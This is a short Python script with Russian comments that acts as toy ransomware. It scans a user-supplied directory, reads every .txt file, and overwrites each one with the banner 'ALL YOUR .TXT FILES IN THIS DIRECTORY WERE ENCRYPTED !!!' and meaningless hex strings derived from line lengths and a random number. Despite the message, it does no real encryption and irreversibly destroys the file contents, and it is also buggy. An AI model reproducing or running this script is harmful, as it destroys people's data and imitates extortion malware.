import os, re, sys, random

path = input('\nУкажите путь для поиска .txt файлов, разделяя двойными слэшами(\\\): ')
a = os.listdir(path)
crypt = []
number = range(1,999999)
x = random.choice(number)

try:
	for line in a:
		print(line)
		b = line.split('.')[-1]         #получаем расширение 
		print(b)						#вывести расширение
		if b == 'txt':  				#если расширение тхт тогда
			c = line 					#с = файл с расширением тхт
			print(c)					
			r = open(line,'r')			#r = открыть файл с тхт расширением на чтение  
			for line in r:				#для строки в этом файле
				print(line)
				crypt.append(line)		#добавить эту строку в список crypt
			r.close()

			if len(crypt) != 0:				#если содержимое .txt файлов записалось в список crypt
				FILE = c 					#переменной файл присваиваем значение файла тхт
				p = open(FILE, 'w')			#p = тхт файл на запись
				p.close()					#создали пустой файл тхт с преждним именем 
				p = open(FILE, 'a')			#открыли его на дозапись
				p.write('ALL YOUR .TXT FILES IN THIS DIRECTORY WERE ENCRYPTED !!! \n')
				p.write('\n')
				for line in crypt:			#для того, что вытащили из тхт файлов
					key = hex(len(str(line))) #key = шифровать в хекс строки, в зависимости от их длинны
					p.write(key + str(x) + str(x) + '\n') #дописывать в файл p шифрованную строку key, добавляя случайные числа
				p.close()
			else:
				print('\n--------------------------Не найдены .txt файлы !!!--------------------------')

		else:
			pass

	if len(crypt) == 0:
		print('\n--------------------------Не найдены .txt файлы !!!--------------------------')
	else:
		pass

except Exception:
	print(sys.exc_info())

print(crypt) 					
